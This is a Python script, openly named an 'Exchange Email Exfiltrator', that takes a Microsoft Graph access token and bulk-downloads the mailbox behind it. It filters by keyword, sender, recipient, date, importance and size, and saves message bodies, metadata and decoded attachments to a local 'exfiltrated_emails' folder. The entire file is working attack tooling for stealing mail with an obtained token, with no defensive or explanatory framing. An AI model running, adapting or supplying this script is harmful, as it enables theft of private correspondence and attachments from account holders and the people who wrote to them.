import requests
import json
import base64
import os
from datetime import datetime
import time
import argparse
from urllib.parse import quote

# This script requires a token from graph.microsoft.com

class EmailExfiltrator:
    def __init__(self, token, output_dir="exfiltrated_emails"):
        self.token = token
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        self.base_url = 'https://graph.microsoft.com/v1.0'
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        
    def sanitize_filename(self, filename):
        # Remove invalid characters from filename
        invalid_chars = '<>:"/\\|?*'
        for char in invalid_chars:
            filename = filename.replace(char, '_')
        return filename[:200]  # Limit filename length
        
    def get_mailbox_info(self):
        """Get information about the mailbox we're accessing"""
        response = requests.get(f'{self.base_url}/me', headers=self.headers)
        if response.status_code == 200:
            return response.json()
        return None

    def search_emails(self, query=None, folder="inbox", max_emails=None, date_range=None, 
                     from_address=None, to_address=None, importance=None, has_attachments=None,
                     attachment_types=None, exclude_terms=None, include_calendar=False,
                     min_size=None, max_size=None):
        """
        Search emails with advanced filtering
        query: Search string for content
        folder: Mailbox folder to search
        max_emails: Maximum number of emails to retrieve
        date_range: Tuple of (start_date, end_date) in ISO format
        from_address: Filter by sender email (can be partial)
        to_address: Filter by recipient email (can be partial)
        importance: Filter by importance ('high', 'normal', 'low')
        has_attachments: Filter for emails with attachments
        attachment_types: List of attachment extensions to filter for (e.g., ['.pdf', '.docx'])
        exclude_terms: List of terms to exclude from results
        include_calendar: Include calendar items
        min_size: Minimum size in bytes
        max_size: Maximum size in bytes
        """
        endpoint = f'{self.base_url}/me/mailFolders/{folder}/messages'
        params = {
            '$select': 'subject,body,receivedDateTime,sender,toRecipients,hasAttachments,attachments,importance,size',
            '$orderby': 'receivedDateTime desc',
            '$top': 50
        }
        
        # Build filter string
        filters = []
        
        # Date range filter
        if date_range:
            start_date, end_date = date_range
            filters.append(f"receivedDateTime ge {start_date} and receivedDateTime le {end_date}")
        
        # Content search filters
        search_conditions = []
        if query:
            # Split query into individual terms for more precise searching
            terms = [term.strip() for term in query.split(',')]
            for term in terms:
                search_conditions.append(f"contains(subject,'{term}') or contains(body/content,'{term}')")
            filters.append(f"({' or '.join(search_conditions)})")
        
        # Exclude terms
        if exclude_terms:
            for term in exclude_terms:
                filters.append(f"not contains(subject,'{term}') and not contains(body/content,'{term}')")
        
        # Sender filter
        if from_address:
            filters.append(f"contains(from/emailAddress/address,'{from_address}')")
        
        # Recipient filter
        if to_address:
            filters.append(f"recipients/any(r:contains(r/emailAddress/address,'{to_address}'))")
        
        # Importance filter
        if importance:
            filters.append(f"importance eq '{importance}'")
        
        # Attachment filters
        if has_attachments is not None:
            filters.append(f"hasAttachments eq {str(has_attachments).lower()}")
        
        # Size filters
        if min_size:
            filters.append(f"size ge {min_size}")
        if max_size:
            filters.append(f"size le {max_size}")
        
        if filters:
            params['$filter'] = ' and '.join(filters)
        
        emails_processed = 0
        next_link = endpoint

        while next_link:
            try:
                if max_emails and emails_processed >= max_emails:
                    break
                    
                response = requests.get(next_link, headers=self.headers, params=params)
                response.raise_for_status()
                data = response.json()
                
                for email in data['value']:
                    if max_emails and emails_processed >= max_emails:
                        break
                        
                    self.process_email(email)
                    emails_processed += 1
                    
                # Update for pagination
                next_link = data.get('@odata.nextLink')
                params = {}  # Clear params as nextLink includes them
                
                # Add delay to avoid rate limiting
                time.sleep(0.5)
                
            except requests.exceptions.RequestException as e:
                print(f"Error retrieving emails: {str(e)}")
                if response.status_code == 429:  # Rate limiting
                    retry_after = int(response.headers.get('Retry-After', 30))
                    print(f"Rate limited. Waiting {retry_after} seconds...")
                    time.sleep(retry_after)
                    continue
                break

        return emails_processed

    def process_email(self, email):
        """Process and save individual email with metadata"""
        try:
            timestamp = datetime.strptime(email['receivedDateTime'], '%Y-%m-%dT%H:%M:%SZ')
            sender = email['sender']['emailAddress']['address']
            subject = self.sanitize_filename(email['subject'] or 'No Subject')
            
            # Create metadata structure
            metadata = {
                'subject': email['subject'],
                'sender': sender,
                'received_time': email['receivedDateTime'],
                'has_attachments': email['hasAttachments'],
                'body_type': email['body']['contentType']
            }
            
            # Create email-specific directory
            email_dir = os.path.join(self.output_dir, f"{timestamp.strftime('%Y%m%d_%H%M%S')}_{subject[:50]}")
            os.makedirs(email_dir, exist_ok=True)
            
            # Save body content
            body_content = email['body']['content']
            body_file = os.path.join(email_dir, 'body.html' if email['body']['contentType'] == 'html' else 'body.txt')
            with open(body_file, 'w', encoding='utf-8') as f:
                f.write(body_content)
            
            # Save metadata
            with open(os.path.join(email_dir, 'metadata.json'), 'w', encoding='utf-8') as f:
                json.dump(metadata, f, indent=2)
            
            # Handle attachments
            if email['hasAttachments']:
                self.process_attachments(email['id'], email_dir)
                
            print(f"Processed: {subject}")
            
        except Exception as e:
            print(f"Error processing email: {str(e)}")

    def process_attachments(self, message_id, email_dir):
        """Download and save email attachments"""
        try:
            attachment_dir = os.path.join(email_dir, 'attachments')
            os.makedirs(attachment_dir, exist_ok=True)
            
            # Get attachment metadata
            response = requests.get(
                f'{self.base_url}/me/messages/{message_id}/attachments',
                headers=self.headers
            )
            response.raise_for_status()
            
            for attachment in response.json()['value']:
                if '@odata.type' in attachment and '#microsoft.graph.fileAttachment' in attachment['@odata.type']:
                    filename = self.sanitize_filename(attachment['name'])
                    content = base64.b64decode(attachment['contentBytes'])
                    
                    with open(os.path.join(attachment_dir, filename), 'wb') as f:
                        f.write(content)
                        
        except Exception as e:
            print(f"Error processing attachments: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='Exchange Email Exfiltrator')
    parser.add_argument('--token', required=True, help='Microsoft Graph API token')
    parser.add_argument('--output', default='exfiltrated_emails', help='Output directory')
    parser.add_argument('--query', help='Search query for email content (comma-separated terms)')
    parser.add_argument('--max-emails', type=int, help='Maximum number of emails to retrieve')
    parser.add_argument('--folder', default='inbox', help='Mailbox folder to search')
    parser.add_argument('--start-date', help='Start date (YYYY-MM-DD)')
    parser.add_argument('--end-date', help='End date (YYYY-MM-DD)')
    parser.add_argument('--from-address', help='Filter by sender email address')
    parser.add_argument('--to-address', help='Filter by recipient email address')
    parser.add_argument('--importance', choices=['high', 'normal', 'low'], help='Filter by importance level')
    parser.add_argument('--has-attachments', action='store_true', help='Filter for emails with attachments')
    parser.add_argument('--attachment-types', help='Comma-separated list of attachment extensions (e.g., .pdf,.docx)')
    parser.add_argument('--exclude-terms', help='Comma-separated list of terms to exclude')
    parser.add_argument('--min-size', type=int, help='Minimum email size in bytes')
    parser.add_argument('--max-size', type=int, help='Maximum email size in bytes')
    
    args = parser.parse_args()
    
    date_range = None
    if args.start_date and args.end_date:
        date_range = (args.start_date, args.end_date)
    
    attachment_types = None
    if args.attachment_types:
        attachment_types = [ext.strip() for ext in args.attachment_types.split(',')]
    
    exclude_terms = None
    if args.exclude_terms:
        exclude_terms = [term.strip() for term in args.exclude_terms.split(',')]
    
    exfiltrator = EmailExfiltrator(args.token, args.output)
    
    # Get mailbox info
    mailbox_info = exfiltrator.get_mailbox_info()
    if mailbox_info:
        print(f"Connected to mailbox: {mailbox_info.get('userPrincipalName')}")
    
    # Start email exfiltration with advanced filters
    emails_processed = exfiltrator.search_emails(
        query=args.query,
        folder=args.folder,
        max_emails=args.max_emails,
        date_range=date_range,
        from_address=args.from_address,
        to_address=args.to_address,
        importance=args.importance,
        has_attachments=args.has_attachments if args.has_attachments else None,
        attachment_types=attachment_types,
        exclude_terms=exclude_terms,
        min_size=args.min_size,
        max_size=args.max_size
    )
    
    print(f"\nExfiltration complete. Processed {emails_processed} emails.")

if __name__ == "__main__":
    main()

